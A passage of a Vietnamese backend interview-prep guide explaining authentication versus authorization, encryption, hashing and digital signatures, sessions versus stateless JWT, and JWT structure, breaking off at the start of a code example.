# Backend — Xác thực & JWT

> Tài liệu ôn tập phỏng vấn — bao gồm toàn bộ kiến thức cần nắm về xác thực: từ khái niệm nền tảng (mã hoá, băm, ký số), cơ chế xác thực (session, token), cấu trúc JWT, chiến lược quản lý token, nơi lưu trữ phía trình duyệt, mã hoá mật khẩu, phân quyền, cho đến OAuth 2.0.

---

## Mục lục

1. [Xác thực và Phân quyền](#1-xác-thực-và-phân-quyền)
2. [Mã hoá, Băm, và Ký số — Ba khái niệm cốt lõi](#2-mã-hoá-băm-và-ký-số--ba-khái-niệm-cốt-lõi)
3. [Stateful và Stateless](#3-stateful-và-stateless)
4. [Xác thực bằng Session và Token](#4-xác-thực-bằng-session-và-token)
5. [JWT — Khái niệm, cấu trúc và cách hoạt động](#5-jwt--khái-niệm-cấu-trúc-và-cách-hoạt-động)
6. [Thuật toán ký — Đối xứng và Bất đối xứng](#6-thuật-toán-ký--đối-xứng-và-bất-đối-xứng)
7. [Access Token và Refresh Token](#7-access-token-và-refresh-token)
8. [Nơi lưu trữ phía trình duyệt — Cookie, localStorage, sessionStorage](#8-nơi-lưu-trữ-phía-trình-duyệt--cookie-localstorage-sessionstorage)
9. [Tấn công XSS và CSRF — Hai mối đe doạ phổ biến](#9-tấn-công-xss-và-csrf--hai-mối-đe-doạ-phổ-biến)
10. [Băm mật khẩu — bcrypt và argon2](#10-băm-mật-khẩu--bcrypt-và-argon2)
11. [OAuth 2.0 — Tổng quan](#11-oauth-20--tổng-quan)
12. [Phân quyền — RBAC, ABAC, ACL](#12-phân-quyền--rbac-abac-acl)
13. [Câu hỏi phỏng vấn thường gặp](#13-câu-hỏi-phỏng-vấn-thường-gặp)

---

# 1. Xác thực và Phân quyền

Đây là **hai bước riêng biệt** trong quy trình bảo mật, luôn đi theo thứ tự: xác thực trước, phân quyền sau.

## Xác thực (Authentication) — "Bạn là ai?"

Xác thực là quá trình **xác minh danh tính** của người dùng. Hệ thống cần chắc chắn rằng người đang truy cập đúng là người mà họ khai báo.

**Các hình thức xác thực phổ biến:**

| Hình thức | Ví dụ |
|---|---|
| Thông tin đăng nhập | Tên đăng nhập + mật khẩu |
| Xác thực nhiều yếu tố (MFA) | Mật khẩu + mã OTP gửi qua điện thoại |
| Sinh trắc học | Vân tay, khuôn mặt |
| Đăng nhập qua bên thứ ba | "Đăng nhập bằng Google/Facebook" (OAuth) |
| Khoá bảo mật vật lý | USB token, thẻ thông minh |

**Khi xác thực thất bại:** Server trả về mã trạng thái **`401`** — nghĩa là "chưa xác thực" (chưa biết bạn là ai).

> Lưu ý: Mã `401` có tên gọi "Unauthorized" nhưng thực tế nghĩa là **chưa xác thực** (unauthenticated). Đây là lỗi đặt tên trong đặc tả HTTP, rất hay được hỏi phỏng vấn.

## Phân quyền (Authorization) — "Bạn được phép làm gì?"

Phân quyền là quá trình **xác định quyền hạn** của người dùng sau khi đã xác thực thành công. Hệ thống biết bạn là ai rồi, bây giờ cần kiểm tra bạn **được phép truy cập tài nguyên nào**, **thực hiện hành động nào**.

**Ví dụ thực tế:**

Một hệ thống quản lý nội dung có 3 vai trò:

| Vai trò | Quyền hạn |
|---|---|
| Quản trị viên (admin) | Toàn quyền — tạo, sửa, xoá bài viết, quản lý người dùng, xem thống kê |
| Biên tập viên (editor) | Tạo và sửa bài viết, nhưng **không được** xoá bài hoặc quản lý người dùng |
| Khách (viewer) | Chỉ được **xem** bài viết, không tạo, sửa, hay xoá |

Khi một biên tập viên cố xoá bài viết → hệ thống trả về mã **`403 Forbidden`** — "tôi biết bạn là ai, nhưng bạn **không có quyền** làm việc này".

**Các khái niệm cốt lõi trong phân quyền:**

| Khái niệm | Giải thích | Ví dụ |
|---|---|---|
| **Quyền (Permission)** | Một hành động cụ thể được phép hoặc không được phép thực hiện | `tạo_bài_viết`, `xoá_người_dùng`, `xem_báo_cáo` |
| **Vai trò (Role)** | Một nhóm các quyền được gộp lại dưới một tên gọi | Vai trò "biên tập viên" = `tạo_bài_viết` + `sửa_bài_viết` |
| **Tài nguyên (Resource)** | Đối tượng mà quyền tác động lên | Bài viết, đơn hàng, hồ sơ người dùng |
| **Chủ thể (Subject)** | Người hoặc thực thể đang yêu cầu quyền truy cập | Người dùng, dịch vụ hệ thống, ứng dụng bên thứ ba |
| **Chính sách (Policy)** | Quy tắc xác định ai được làm gì với tài nguyên nào | "Chỉ quản trị viên mới được xoá người dùng" |

## Bảng so sánh tổng quan

| | Xác thực | Phân quyền |
|---|---|---|
| **Trả lời câu hỏi** | "Bạn là **ai**?" | "Bạn được phép làm **gì**?" |
| **Diễn ra khi nào** | Lúc đăng nhập | Sau khi đã xác thực xong |
| **Thực hiện bằng** | Mật khẩu, OTP, sinh trắc học, OAuth | Vai trò, quyền hạn, chính sách |
| **Mã trạng thái HTTP khi thất bại** | `401` — chưa xác thực | `403` — không có quyền |
| **Ví dụ đời thường** | Quẹt thẻ vào toà nhà (xác minh bạn là nhân viên) | Tầng 5 chỉ cho phép ban giám đốc vào (kiểm tra quyền) |

```
Luồng hoạt động:

Người dùng gửi yêu cầu
        ↓
   ┌─────────────────────┐
   │  BƯỚC 1: Xác thực   │ ← Bạn là ai?
   │  (Authentication)    │
   └────────┬────────────┘
            │ Thành công → biết danh tính
            ↓
   ┌─────────────────────┐
   │  BƯỚC 2: Phân quyền  │ ← Bạn có quyền không?
   │  (Authorization)     │
   └────────┬────────────┘
            │ Có quyền
            ↓
     Trả kết quả cho người dùng
```

---

# 2. Mã hoá, Băm, và Ký số — Ba khái niệm cốt lõi

Đây là ba khái niệm hoàn toàn khác nhau nhưng rất dễ nhầm lẫn. Hiểu rõ bản chất của từng cái là nền tảng để hiểu toàn bộ hệ thống xác thực.

## Mã hoá (Encryption) — "Giấu nội dung đi, chỉ ai có khoá mới đọc được"

### Bản chất

Mã hoá là quá trình **biến đổi dữ liệu** từ dạng đọc được (bản rõ) thành dạng không đọc được (bản mã), sao cho **chỉ người có khoá** mới giải mã ngược lại được.

**Đặc điểm quan trọng nhất:** Mã hoá là quá trình **hai chiều** — mã hoá được thì **giải mã được**. Đây là điểm khác biệt cốt lõi so với băm.

**Mục đích:** Đảm bảo **tính bí mật** — người ngoài không đọc được nội dung.

### Ví dụ đời thường

Bạn viết một bức thư, rồi bỏ vào **hộp khoá**. Chỉ ai có chìa khoá mới mở ra đọc được. Người khác nhặt được hộp thì chỉ thấy một cái hộp kín, không biết bên trong viết gì.

### Hai loại mã hoá

**a) Mã hoá đối xứng — Một khoá duy nhất**

Cả hai bên (người gửi và người nhận) dùng **cùng một khoá** để mã hoá và giải mã.

```
Bản rõ: "Xin chào"
            ↓
     ┌──────────────┐
     │  Mã hoá      │ ← Khoá: "abc123"
     └──────┬───────┘
            ↓
Bản mã: "7f3a9c2b..."   ← Không đọc được
            ↓
     ┌──────────────┐
     │  Giải mã     │ ← Cùng khoá: "abc123"
     └──────┬───────┘
            ↓
Bản rõ: "Xin chào"      ← Khôi phục nguyên bản
```

- **Ưu điểm:** Nhanh, hiệu suất cao.
- **Nhược điểm:** Cả hai bên phải có cùng khoá → nếu khoá bị lộ, mọi dữ liệu đều bị đọc được. Vấn đề lớn nhất là **làm sao gửi khoá an toàn** cho đối phương?
- **Thuật toán phổ biến:** AES (tiêu chuẩn hiện tại, rất phổ biến), ChaCha20.
- **Dùng khi:** Mã hoá dữ liệu lớn (file, ổ đĩa, kết nối HTTPS sau khi bắt tay).

**b) Mã hoá bất đối xứng — Cặp khoá (khoá công khai + khoá riêng)**

Dùng **hai khoá khác nhau**: khoá công khai để mã hoá, khoá riêng để giải mã (hoặc ngược lại khi ký số).

```
                    Bên gửi                              Bên nhận
                       │                                    │
Bản rõ: "Xin chào"     │                                    │
          ↓            │                                    │
   ┌──────────────┐    │                                    │
   │  Mã hoá      │ ← Khoá CÔNG KHAI của bên nhận           │
   └──────┬───────┘    │                                    │
          ↓            │                                    │
Bản mã: "9d4e..."  ───────────── gửi qua mạng ──────────►   │
                       │                              ┌──────────────┐
                       │                              │  Giải mã     │ ← Khoá RIÊNG
                       │                              └──────┬───────┘
                       │                                     ↓
                       │                              Bản rõ: "Xin chào"
```

- **Ưu điểm:** Không cần chia sẻ khoá riêng. Khoá công khai ai có cũng được — không sợ lộ.
- **Nhược điểm:** Chậm hơn mã hoá đối xứng rất nhiều (hàng chục đến hàng trăm lần).
- **Thuật toán phổ biến:** RSA, ECC (đường cong Elliptic).
- **Dùng khi:** Trao đổi khoá ban đầu, ký số, chứng chỉ SSL/TLS.

> Thực tế, HTTPS kết hợp cả hai: dùng bất đối xứng để **trao đổi khoá** an toàn ban đầu, sau đó dùng đối xứng (AES) để **mã hoá dữ liệu** vì nhanh hơn. Cách kết hợp này gọi là **mã hoá lai (hybrid encryption)**.

---

## Băm (Hashing) — "Nghiền nát, không thể khôi phục"

### Bản chất

Băm là quá trình biến đổi dữ liệu (bất kỳ kích thước nào) thành một **chuỗi có độ dài cố định** (gọi là giá trị băm, hay digest). Quá trình này là **một chiều** — **không thể đảo ngược** từ giá trị băm ra dữ liệu ban đầu.

**Đặc điểm quan trọng nhất:** Băm là quá trình **một chiều** — băm được nhưng **không giải băm được**. Không có khoá, không có cách khôi phục.

**Mục đích:** Đảm bảo **tính toàn vẹn** — kiểm tra dữ liệu có bị thay đổi không.

### Ví dụ đời thường

Giống như **xay thịt thành pate** — bạn không thể "xay ngược" từ pate ra miếng thịt ban đầu. Hoặc giống như **dấu vân tay** — mỗi người có dấu vân tay riêng, nhưng từ dấu vân tay bạn không thể tái tạo ra con người.

### Cách hoạt động

```
Dữ liệu đầu vào               Hàm băm              Giá trị băm (cố định)
─────────────────────────────────────────────────────────────────────────
"Xin chào"               →    SHA-256     →    "2cf24dba5fb0a30e..."  (64 ký tự hex)
"Xin chào!"              →    SHA-256     →    "a9993e364706816a..."  (64 ký tự hex)
(Toàn bộ nội dung Wikipedia) → SHA-256     →    "f4d5e9c31b7a..."     (vẫn 64 ký tự hex)
```

### Các tính chất quan trọng của hàm băm

| Tính chất | Giải thích |
|---|---|
| **Một chiều** | Không thể tính ngược từ giá trị băm ra dữ liệu ban đầu |
| **Xác định** | Cùng dữ liệu đầu vào → luôn cho cùng giá trị băm (không ngẫu nhiên) |
| **Độ dài cố định** | Dù đầu vào dài hay ngắn, kết quả luôn có cùng độ dài |
| **Hiệu ứng tuyết lở** | Thay đổi 1 ký tự đầu vào → giá trị băm thay đổi hoàn toàn, không có quy luật |
| **Chống va chạm** | **Không khả thi về mặt tính toán** (computationally infeasible) để tìm được 2 dữ liệu khác nhau cho cùng giá trị băm |

### Ứng dụng của băm

| Ứng dụng | Cách dùng |
|---|---|
| **Lưu mật khẩu** | Băm mật khẩu trước khi lưu vào cơ sở dữ liệu. Khi đăng nhập, băm mật khẩu người dùng nhập rồi **so sánh** với giá trị đã lưu |
| **Kiểm tra tính toàn vẹn file** | Tải file xong → tính giá trị băm → so với giá trị băm trên trang chủ → nếu khớp thì file không bị sửa |
| **Chữ ký số** | Băm tài liệu trước rồi mới ký (vì ký trên dữ liệu nhỏ nhanh hơn nhiều) |
| **Cấu trúc dữ liệu** | Bảng băm (hash table), chuỗi khối (blockchain) |

> **Tại sao không dùng mã hoá để lưu mật khẩu?** Vì mã hoá thì giải mã được. Nếu kẻ tấn công chiếm được cơ sở dữ liệu VÀ khoá giải mã → toàn bộ mật khẩu bị lộ. Với băm, kể cả chiếm được cơ sở dữ liệu thì cũng **không thể đảo ngược** ra mật khẩu gốc.

---

## Ký số (Digital Signature) — "Đóng dấu xác nhận, đảm bảo không ai sửa"

### Bản chất

Ký số là quá trình dùng **khoá riêng** để tạo một "chữ ký" cho dữ liệu. Bất kỳ ai có **khoá công khai** đều có thể kiểm tra chữ ký đó có hợp lệ không.

**Mục đích:** Đảm bảo **hai điều** cùng lúc:
- **Tính toàn vẹn** — dữ liệu chưa bị sửa đổi
- **Tính xác thực** — dữ liệu đúng là do người giữ khoá riêng tạo ra (không ai giả mạo được)

### Ví dụ đời thường

Giống **con dấu của giám đốc** đóng trên hợp đồng. Ai cũng nhìn được con dấu (khoá công khai = mẫu dấu treo ở bảng thông báo), ai cũng kiểm tra được dấu có thật không, nhưng **chỉ giám đốc mới có con dấu** để đóng (khoá riêng).

### Cách hoạt động

```
BƯỚC 1: Ký (người gửi)

  Dữ liệu gốc: "Nội dung hợp đồng..."
        ↓
  Băm (SHA-256) → "a3f2c9..."  (giá trị băm — bản tóm tắt)
        ↓
  Mã hoá giá trị băm bằng KHOÁ RIÊNG → "x7k9m2..."  (đây là chữ ký)
        ↓
  Gửi đi: [Dữ liệu gốc] + [Chữ ký]


BƯỚC 2: Xác minh (người nhận)

  Nhận: [Dữ liệu gốc] + [Chữ ký]
        ↓
  ┌── Nhánh 1: Băm dữ liệu gốc (SHA-256) → "a3f2c9..."
  │
  ├── Nhánh 2: Giải mã chữ ký bằng KHOÁ CÔNG KHAI → "a3f2c9..."
  │
  └── So sánh: Nhánh 1 = Nhánh 2 → ✅ Chữ ký hợp lệ, dữ liệu chưa bị sửa
                Nhánh 1 ≠ Nhánh 2 → ❌ Từ chối
```

> **Tại sao phải băm trước rồi mới ký?** Vì mã hoá bất đối xứng rất chậm. Nếu dữ liệu lớn (ví dụ file 100MB), ký trực tiếp sẽ cực kỳ tốn thời gian. Băm trước cho ra chuỗi nhỏ cố định (32 byte với SHA-256), rồi ký trên chuỗi nhỏ đó → nhanh hơn rất nhiều.

### JWT dùng ký số như thế nào?

JWT (dạng JWS) chính là một ứng dụng của ký số:

```
JWT = Base64(Header) + "." + Base64(Payload) + "." + Chữ_ký

Chữ_ký = Ký( Base64(Header) + "." + Base64(Payload), khoá_bí_mật )
```

- Bất kỳ ai cũng **đọc được** Header và Payload (chỉ cần giải mã Base64)
- Nhưng **không ai sửa được** nội dung mà không bị phát hiện (vì chữ ký sẽ không khớp)
- **Không ai tạo được** chữ ký hợp lệ mà không có khoá bí mật

> **Lưu ý:** JWT thường dùng **HS256** (HMAC — dùng shared secret, không phải ký số theo nghĩa chặt chẽ vì không có cặp khoá công khai/riêng, không có tính non-repudiation) hoặc **RS256** (ký số thực sự bằng RSA). Xem [Section 6](#6-thuật-toán-ký--đối-xứng-và-bất-đối-xứng) để phân biệt chi tiết.

---

## Bảng so sánh: Mã hoá — Băm — Ký số

| | Mã hoá (Encryption) | Băm (Hashing) | Ký số (Digital Signature) |
|---|---|---|---|
| **Chiều** | Hai chiều (mã hoá ↔ giải mã) | Một chiều (không đảo ngược) | Ký bằng khoá riêng (một chiều), xác minh bằng khoá công khai |
| **Cần khoá không?** | Có — khoá mã hoá/giải mã | Không cần khoá | Có — khoá riêng để ký, khoá công khai để xác minh |
| **Mục đích chính** | **Bí mật** — giấu nội dung | **Toàn vẹn** — phát hiện sửa đổi | **Toàn vẹn + Xác thực** — không sửa được, không giả mạo được |
| **Câu hỏi trả lời** | "Ai đọc được?" | "Dữ liệu có bị thay đổi không?" | "Ai tạo ra dữ liệu này? Có bị sửa không?" |
| **Ví dụ đời thường** | Bỏ thư vào hộp khoá → chỉ ai có chìa mới đọc | Dấu vân tay → nhận dạng nhưng không tái tạo | Con dấu giám đốc → xác nhận nguồn gốc |
| **Ứng dụng** | HTTPS, mã hoá file, mã hoá ổ đĩa | Lưu mật khẩu, kiểm tra file, blockchain | JWT, chứng chỉ SSL, xác minh phần mềm |

### Tóm gọn để nhớ

```
Mã hoá  → "Giấu đi"       → Khoá lại, mở ra được   → Bí mật
Băm     → "Nghiền nát"     → Một chiều, không mở lại → Toàn vẹn
Ký số   → "Đóng dấu"      → Xác nhận nguồn gốc     → Toàn vẹn + Xác thực
```

---

# 3. Stateful và Stateless

Hai khái niệm này cực kỳ quan trọng trong thiết kế hệ thống, đặc biệt khi nói về xác thực.

## Stateful (Có trạng thái) — "Server nhớ bạn"

### Bản chất

Server **lưu trữ thông tin** về phiên làm việc của người dùng. Mỗi khi nhận yêu cầu, server phải **tra cứu** thông tin đã lưu để biết người dùng là ai và đang ở trạng thái nào.

### Ví dụ đời thường

Giống như bạn đến quán cà phê quen — nhân viên **nhớ mặt** bạn, nhớ bạn hay uống gì, đang có tích điểm bao nhiêu. Mọi thông tin về bạn nằm trong **sổ ghi chép** của quán (server lưu trữ).

### Cách hoạt động với xác thực (Session)

```
Yêu cầu 1: Đăng nhập
  Client ──► Server: "Tôi là Hùng, mật khẩu là 123"
  Server ──► Tạo session, lưu vào bộ nhớ: { id: "abc", user: "Hùng", role: "admin" }
  Server ──► Client: "Đây là mã phiên của bạn: abc"

Yêu cầu 2: Lấy thông tin
  Client ──► Server: "Tôi có mã phiên abc, cho tôi xem hồ sơ"
  Server ──► Tra cứu bộ nhớ: mã "abc" → Hùng, admin
  Server ──► Client: "Đây là hồ sơ của Hùng"
```

Server phải **tra cứu** mỗi lần → server phải **nhớ** (lưu trạng thái).

### Ưu điểm

- **Dễ thu hồi:** Muốn đuổi người dùng ra → xoá session là xong, hiệu lực ngay lập tức
- **Bảo mật cao hơn:** Thông tin nhạy cảm nằm trên server, phía người dùng chỉ giữ mã phiên (session ID)
- **Toàn quyền kiểm soát:** Server biết chính xác ai đang online, bao nhiêu phiên đang hoạt động

### Nhược điểm

- **Tốn bộ nhớ:** 1 triệu người dùng = 1 triệu session phải lưu
- **Khó mở rộng:** Khi có nhiều server, tất cả phải **chia sẻ** chung kho session (dùng Redis hoặc cơ sở dữ liệu dùng chung). Nếu không, người dùng đăng nhập ở server A nhưng yêu cầu tiếp theo lại đến server B → server B không tìm thấy session → lỗi
- **Điểm lỗi tập trung:** Kho session sập → toàn bộ người dùng bị đăng xuất

```
Vấn đề mở rộng với stateful:

                  Cân bằng tải
                      │
          ┌───────────┼───────────┐
          ↓           ↓           ↓
     Server A     Server B     Server C
     (session     (session     (session
      của An)      của Bình)    của Chi)
          │           │           │
          └───────────┼───────────┘
                      ↓
              Kho session dùng chung (Redis)  ← TẤT CẢ server phải dùng chung
```

---

## Stateless (Không trạng thái) — "Server không nhớ gì cả"

### Bản chất

Server **không lưu** bất kỳ thông tin nào về phiên làm việc. Mỗi yêu cầu phải **mang theo đầy đủ** thông tin cần thiết để server xử lý. Server nhận yêu cầu → xử lý → trả kết quả → **quên ngay**.

### Ví dụ đời thường

Giống như bạn đến một quầy vé tự động. Bạn đưa tấm vé (token) ra, máy quét vé → biết bạn mua vé loại gì, ngồi ghế nào → cho bạn vào. Máy **không nhớ** bạn là ai, không tra sổ gì cả — mọi thông tin đã có sẵn **trên tấm vé**.

### Cách hoạt động với xác thực (JWT)

```
Yêu cầu 1: Đăng nhập
  Client ──► Server: "Tôi là Hùng, mật khẩu là 123"
  Server ──► Tạo JWT chứa { user: "Hùng", role: "admin", exp: ... }
  Server ──► Ký JWT bằng khoá bí mật
  Server ──► Client: "Đây là token của bạn"
  Server ──► KHÔNG LƯU GÌ CẢ

Yêu cầu 2: Lấy thông tin
  Client ──► Server: "Đây là token của tôi, cho tôi xem hồ sơ"
  Server ──► Xác minh chữ ký → hợp lệ → đọc payload: Hùng, admin
  Server ──► Client: "Đây là hồ sơ của Hùng"
  Server ──► KHÔNG TRA CỨU GÌ, KHÔNG NHỚ GÌ
```

Server **không tra cứu**, **không lưu trữ** → mỗi yêu cầu hoàn toàn độc lập.

### Ưu điểm

- **Dễ mở rộng:** Thêm bao nhiêu server cũng được, mỗi server tự xác minh token, không cần chia sẻ dữ liệu
- **Hiệu suất cao:** Không tốn thời gian tra cứu cơ sở dữ liệu hay bộ nhớ
- **Phù hợp kiến trúc phân tán:** Microservices, ứng dụng di động, API công khai

### Nhược điểm

- **Khó thu hồi:** Token đã cấp thì vẫn hợp lệ cho đến khi hết hạn. Muốn thu hồi ngay phải dùng thêm danh sách đen (lại thành stateful một phần)
- **Kích thước lớn hơn:** Token chứa cả dữ liệu bên trong → lớn hơn session ID (chỉ là một mã ngắn)
- **Không thể cập nhật giữa chừng:** Nếu quyền của người dùng thay đổi → token cũ vẫn mang quyền cũ cho đến khi hết hạn

```
Mở rộng dễ dàng với stateless:

                  Cân bằng tải
                      │
          ┌───────────┼───────────┐
          ↓           ↓           ↓
     Server A     Server B     Server C
     (có khoá     (có khoá     (có khoá
      xác minh)    xác minh)    xác minh)

  → Yêu cầu đến server nào cũng được, mỗi server TỰ xác minh token
  → KHÔNG cần kho dùng chung
```

## Bảng so sánh tổng quan

| | Stateful (Có trạng thái) | Stateless (Không trạng thái) |
|---|---|---|
| **Server lưu gì** | Lưu thông tin phiên (session) | Không lưu gì |
| **Yêu cầu mang theo gì** | Mã phiên (session ID) — rất ngắn | Token chứa đầy đủ thông tin — dài hơn |
| **Tra cứu** | Phải tra cứu mỗi yêu cầu | Không tra cứu, chỉ xác minh chữ ký |
| **Thu hồi** | Ngay lập tức (xoá session) | Khó (token còn hạn thì vẫn hợp lệ) |
| **Mở rộng** | Khó (cần kho dùng chung) | Dễ (thêm server tuỳ ý) |
| **Ứng dụng** | Session-based authentication | JWT, REST API, microservices |
| **Ví dụ** | Cuộc gọi điện thoại (duy trì kết nối liên tục) | Gửi thư (mỗi lá thư độc lập, có đầy đủ thông tin) |

---

# 4. Xác thực bằng Session và Token

## Xác thực bằng Session (Stateful)

```
Client                          Server                    Kho lưu trữ
  │                               │                           │
  │── POST /login ───────────────►│                           │
  │   { email, password }         │── xác minh thông tin ────►│
  │                               │◄── tìm thấy user ────────│
  │                               │                           │
  │                               │── Tạo session ───────────►│
  │                               │   (lưu vào memory/Redis)  │
  │                               │                           │
  │◄── Set-Cookie: sid=abc123 ────│                           │
  │                               │                           │
  │── GET /profile ──────────────►│                           │
  │   Cookie: sid=abc123          │── Tra cứu session ───────►│
  │                               │◄── dữ liệu session ──────│
  │◄── 200 { thông tin user } ────│                           │
```

**Cơ chế hoạt động:**

1. Người dùng đăng nhập → Server tạo một **phiên làm việc (session)** và lưu trên server (bộ nhớ, Redis, hoặc cơ sở dữ liệu)
2. Server trả về **mã phiên (Session ID)** thông qua header `Set-Cookie`
3. Trình duyệt **tự động gửi** cookie kèm theo mọi yêu cầu
4. Server tra cứu mã phiên → tìm được dữ liệu session → xác thực thành công

**Nói đơn giản:** Giống như bạn đến khách sạn — khách sạn cấp cho bạn một tấm thẻ phòng (session ID), rồi mỗi lần vào phòng bạn quẹt thẻ, lễ tân tra sổ để biết bạn là ai, phòng mấy.

**Ưu điểm:**
- Dễ thu hồi quyền truy cập (xoá session trên server là xong)
- Dữ liệu phiên lưu trên server → phía client không đọc được thông tin nhạy cảm
- Server toàn quyền kiểm soát

**Nhược điểm:**
- **Có trạng thái (stateful)** — server phải lưu trữ session → tốn bộ nhớ
- **Khó mở rộng** — nhiều server phải chia sẻ chung kho session
- **Dễ bị tấn công CSRF** — cookie tự động gửi theo yêu cầu → kẻ tấn công có thể lợi dụng
- Không phù hợp cho ứng dụng di động, SPA, hoặc kiến trúc microservices

## Xác thực bằng Token — JWT (Stateless)

```
Client                          Server
  │                               │
  │── POST /login ───────────────►│
  │   { email, password }         │── xác minh thông tin
  │                               │── Tạo JWT (ký bằng khoá bí mật)
  │◄── { accessToken, refresh } ──│      ← KHÔNG lưu gì trên server
  │                               │
  │── GET /profile ──────────────►│
  │   Authorization: Bearer xxx   │── Xác minh chữ ký JWT
  │                               │── Giải mã payload → lấy thông tin user
  │◄── 200 { thông tin user } ───│
```

**Cơ chế hoạt động:**

1. Người dùng đăng nhập → Server tạo một **JWT**, ký bằng khoá bí mật
2. Trả JWT về cho client → client tự lưu trữ
3. Mỗi yêu cầu, client gửi JWT trong header `Authorization: Bearer <token>`
4. Server **xác minh chữ ký** → giải mã payload → xác thực (**không cần tra cứu cơ sở dữ liệu**)

**Nói đơn giản:** Giống như bạn có một tấm hộ chiếu (JWT). Mỗi lần qua cửa, nhân viên chỉ cần kiểm tra con dấu trên hộ chiếu (chữ ký) — không cần gọi điện về trung tâm để hỏi.

**Ưu điểm:**
- **Không trạng thái (stateless)** — server không lưu gì → dễ mở rộng theo chiều ngang
- Phù hợp cho **microservices** — mỗi dịch vụ tự xác minh JWT mà không cần gọi về dịch vụ xác thực
- Hoạt động tốt với ứng dụng di động, SPA, và các hệ thống khác tên miền

**Nhược điểm:**
- Khó **thu hồi** — JWT đã cấp thì vẫn hợp lệ cho đến khi hết hạn
- Phần payload có thể bị đọc (vì chỉ mã hoá base64, không phải mã hoá thật) → **tuyệt đối không lưu thông tin nhạy cảm**
- Kích thước token lớn hơn mã phiên

## Bảng so sánh tổng quan

| | Xác thực bằng Session | Xác thực bằng Token (JWT) |
|---|---|---|
| **Trạng thái** | Có trạng thái (server lưu) | Không trạng thái (client lưu) |
| **Mở rộng** | Khó (phải chia sẻ kho session) | Dễ (mỗi server tự xác minh) |
| **Thu hồi** | Dễ (xoá session) | Khó (phải dùng danh sách đen hoặc đặt thời hạn ngắn) |
| **Lưu trữ** | Cookie (trình duyệt tự gửi) | Bộ nhớ JS / httpOnly cookie |
| **CSRF** | Có nguy cơ | Không (nếu gửi qua header) |
| **XSS** | Ít rủi ro (httpOnly cookie) | Có rủi ro nếu lưu trong localStorage |
| **Ứng dụng di động** | Không lý tưởng | Phù hợp |
| **Microservices** | Không lý tưởng | Phù hợp |
| **Khi nào dùng** | Ứng dụng render phía server, nội bộ | SPA, di động, API, microservices |

---

# 5. JWT — Khái niệm, cấu trúc và cách hoạt động

## JWT là gì?

**JWT (JSON Web Token)** là một tiêu chuẩn mở (RFC 7519) định nghĩa cách truyền thông tin giữa các bên dưới dạng một đối tượng JSON, **nhỏ gọn** và **tự chứa**.

**Nói đơn giản:** JWT giống một **phong bì niêm phong** có con dấu. Bên trong chứa thông tin (payload). Bất kỳ ai cũng **mở ra đọc được** (vì phong bì trong suốt), nhưng con dấu niêm phong đảm bảo **không ai sửa được nội dung** mà không bị phát hiện.

### Hai đặc điểm quan trọng nhất

| Đặc điểm | Giải thích |
|---|---|
| **Nhỏ gọn (compact)** | Chỉ là một chuỗi ký tự duy nhất, gửi qua URL, header HTTP, hoặc cookie đều được |
| **Tự chứa (self-contained)** | Payload chứa sẵn thông tin người dùng → server **không cần tra cứu cơ sở dữ liệu** để xác thực |

### JWT nằm trong "gia đình" nào?

```
JOSE (JSON Object Signing and Encryption) — bộ tiêu chuẩn
│
├── JWS (JSON Web Signature)  ← ký số → đảm bảo TOÀN VẸN (không ai sửa được)
│   └── JWT thường dùng = JWS  ← Token bạn gặp hàng ngày là loại này
│
├── JWE (JSON Web Encryption) ← mã hoá → đảm bảo BÍ MẬT (không ai đọc được)
│   └── JWT mã hoá = JWE       ← Rất hiếm khi cần
│
├── JWK (JSON Web Key)        ← định dạng khoá
│
└── JWA (JSON Web Algorithms) ← danh sách thuật toán được phép dùng
```

> Khi nói "JWT" mà không nói rõ, mặc định là **JWS** (ký, không mã hoá). Nếu cần mã hoá nội dung token → phải dùng **JWE**, nhưng thực tế 99% dự án chỉ dùng JWS.

### JWT dùng để làm gì?

| Mục đích | Ví dụ |
|---|---|
| **Xác thực** | Người dùng đăng nhập → nhận JWT → gửi kèm mỗi yêu cầu → server xác minh |
| **Trao đổi thông tin** | Hai hệ thống truyền dữ liệu an toàn, chữ ký đảm bảo không bị sửa giữa đường |
| **Đăng nhập một lần (SSO)** | Đăng nhập một lần → JWT dùng được trên nhiều ứng dụng cùng hệ thống |

---

## Cấu trúc JWT — 3 phần

JWT gồm **3 phần**, ngăn cách bởi dấu chấm (`.`):

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NSJ9.T4Hk8gHxx4VpLBPEbWGHIW9BR2M6vS5jLoM5gqoB1vI
└──── Header ────┘ └──── Payload ────┘ └────────── Signature ──────────┘
```

### Header — Thuật toán ký và loại token

```json
{
  "alg": "HS256",     // Thuật toán ký (HS256, RS256, ES256...)
  "typ": "JWT"        // Loại token
}
```

Header được mã hoá bằng Base64URL → trở thành phần đầu tiên của chuỗi JWT.

### Payload — Dữ liệu (các claims)

```json
{
  "sub": "12345",           // Subject — mã định danh người dùng
  "iat": 1708400000,       // Issued At — thời điểm tạo
  "exp": 1708403600,       // Expiration — thời điểm hết hạn
  "iss": "my-app",         // Issuer — ai cấp token
  "aud": "my-api",         // Audience — token dành cho ai
  "nbf": 1708400000,       // Not Before — không dùng trước thời điểm này
  "jti": "unique-id-123",  // JWT ID — mã định danh duy nhất của token
  "role": "admin"           // Thông tin tuỳ chỉnh
}
```

**3 loại Claims:**

| Loại | Giải thích | Ví dụ |
|---|---|---|
| **Registered** (đã đăng ký) | Được định nghĩa sẵn trong RFC, không bắt buộc nhưng nên dùng | `sub`, `iss`, `aud`, `exp`, `iat`, `nbf`, `jti` |
| **Public** (công khai) | Do cộng đồng đăng ký, tránh xung đột tên | `email`, `name`, `picture` |
| **Private** (riêng tư) | Do lập trình viên tự đặt, thoả thuận giữa các bên | `role`, `permissions`, `tenant_id` |

> **Tuyệt đối không lưu thông tin nhạy cảm** trong payload — bất kỳ ai cũng đọc được chỉ bằng cách giải mã Base64.

### Signature — Chữ ký

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  khoá_bí_mật
)
```

Chữ ký được tạo từ Header + Payload + Khoá bí mật. Nó đảm bảo **tính toàn vẹn** — nếu có ai sửa bất kỳ byte nào trong header hoặc payload, chữ ký sẽ không còn khớp → server từ chối token.

---

## JWT chỉ ký, không mã hoá — Điểm mấu chốt

JWT (dạng JWS) **chỉ ký** chứ **không mã hoá**. Bất kỳ ai có token đều có thể **đọc toàn bộ payload** bằng cách giải mã base64 — không cần biết khoá bí mật.

Chữ ký chỉ đảm bảo **không ai sửa được** payload, chứ **không đảm bảo không ai đọc được**.

```javascript
// Bất kỳ ai cũng có thể đọc payload — KHÔNG cần khoá bí mật
